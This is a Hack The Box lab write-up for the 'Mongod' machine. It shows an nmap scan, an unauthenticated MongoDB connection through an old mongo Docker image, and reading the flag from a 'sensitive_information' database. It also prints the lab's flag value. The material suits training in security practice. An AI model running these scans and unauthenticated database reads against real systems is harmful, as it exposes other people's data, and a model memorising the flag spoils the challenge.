# [HackTheBox] [Mongod]: [Enumeration], [Foothold]

**Target:** [Mongod] | **OS:** Linux | **Difficulty:** Super Easy  
**Attack Vector:** [Enumeration -> Foothold]

---

## 1. Enumeration

```bash
sudo nmap -p- -sS --min-rate 5000 -T3 10.129.228.30
```

`PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod`

So, after investigating about mongod, its the default port for `MongoDB` which also uses mongos query to handle clinet connections via MongoDB wire protocol

Now lets see the default command to connect to this DB

```shell
mongosh --host 10.129.228.30 --port 27017
Current Mongosh Log ID:	6af9727f69abf029cbe94ee4
Connecting to:		mongodb://10.129.228.30:27017/?directConnection=true&appName=mongosh+2.14.0
MongoServerSelectionError: Server at 10.129.228.30:27017 reports maximum wire version 6, but this version of the Node.js Driver requires at least 8 (MongoDB 4.2)
```

I tried this but it wasn't allowing me because of the version, mongosh is too recent for the old DB we have to connect so i used Docker to simulate the old version which is `mongo`

## 2. Foothold

```shell
docker run -it --rm mongo:3.6 mongo --host 10.129.228.30 --port 27017
```

After this command we are succesfully in, now lets see whats inside

```shell
show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
```

## 3. Flag

```shell 
use admin
switched to db admin
db
admin
show collections
system.version
use sensitive_information
switched to db sensitive_information
show collections
flag
db.flag.find().pretty()
{
	"_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
	"flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}
```

Pwned.
